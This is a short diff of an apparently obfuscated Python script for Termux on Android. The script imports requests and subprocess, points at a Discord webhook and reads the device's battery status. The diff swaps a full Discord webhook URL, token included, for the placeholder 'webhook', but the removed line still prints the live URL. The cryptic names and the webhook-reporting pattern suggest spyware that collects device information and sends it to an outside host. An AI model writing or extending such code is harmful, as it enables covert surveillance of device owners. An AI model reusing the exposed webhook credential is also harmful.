@@ -1,5 +1,5 @@
 import requests as a2,subprocess as a3,datetime as a4,platform as a5,os as a6
-a7="https://discord.com/api/webhooks/1253136109026934855/voPwC3NOLerLzyJ20rsI0wMQXsVnKKc9yoHTkcLXYzsXPlMMPjv0ExrnuBiEVFCEwYGc"
+a7="webhook"
 status=1
 def a8():
     try:return a3.check_output(["termux-battery-status"]).decode()
